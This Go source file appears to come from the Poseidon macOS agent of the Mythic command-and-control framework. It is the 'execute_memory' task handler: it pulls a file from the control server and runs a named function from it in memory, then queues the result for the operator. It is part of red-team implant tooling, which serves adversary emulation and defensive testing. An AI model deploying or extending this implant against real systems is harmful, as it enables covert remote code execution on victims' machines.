package execute_memory

import (
	// Standard
	"encoding/json"
	"fmt"
	"sync"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// initial .m code pulled from https://github.com/its-a-feature/macos_execute_from_memory
// and https://github.com/opensource-apple/dyld/tree/master/unit-tests/test-cases/bundle-memory-load
var mu sync.Mutex

type executeMemoryArgs struct {
	FileID       string `json:"file_id"`
	FunctionName string `json:"function_name"`
	ArgString    string `json:"args"`
}

type getFile func(r structs.FileRequest, ch chan []byte) ([]byte, error)

//Run - interface method that retrieves a process list
func Run(task structs.Task, ch chan []byte, f getFile) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID

	args := executeMemoryArgs{}

	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters: %s", err.Error()))
		encErrResp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
		mu.Unlock()
		return
	}
	r := structs.FileRequest{}
	r.TaskID = task.TaskID
	r.FileID = args.FileID
	r.ChunkNumber = 0
	r.TotalChunks = 0

	fBytes, err := f(r, ch)

	if err != nil {
		msg.SetError(fmt.Sprintf("Failed to get file. Reason: %s", err.Error()))
		encErrResp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
		mu.Unlock()
		return
	}
	//fmt.Printf("started run in execute_memory\n")
	var final string
	//fmt.Printf("%d\n", cap(fBytes))
	//fmt.Printf("In Run, function_name: %s\n", args.FunctionName)
	resp, _ := executeMemory(fBytes, args.FunctionName, args.ArgString)
	//fmt.Printf("got response from executeMemory\n")
	//fmt.Printf(resp.Message)
	final = resp.Message
	if len(final) == 0 {
		final = "Function did not return data"
	}
	msg.Completed = true
	msg.UserOutput = final
	respMarshal, _ := json.Marshal(msg)
	mu.Lock()
	profiles.TaskResponses = append(profiles.TaskResponses, respMarshal)
	mu.Unlock()
	return
}
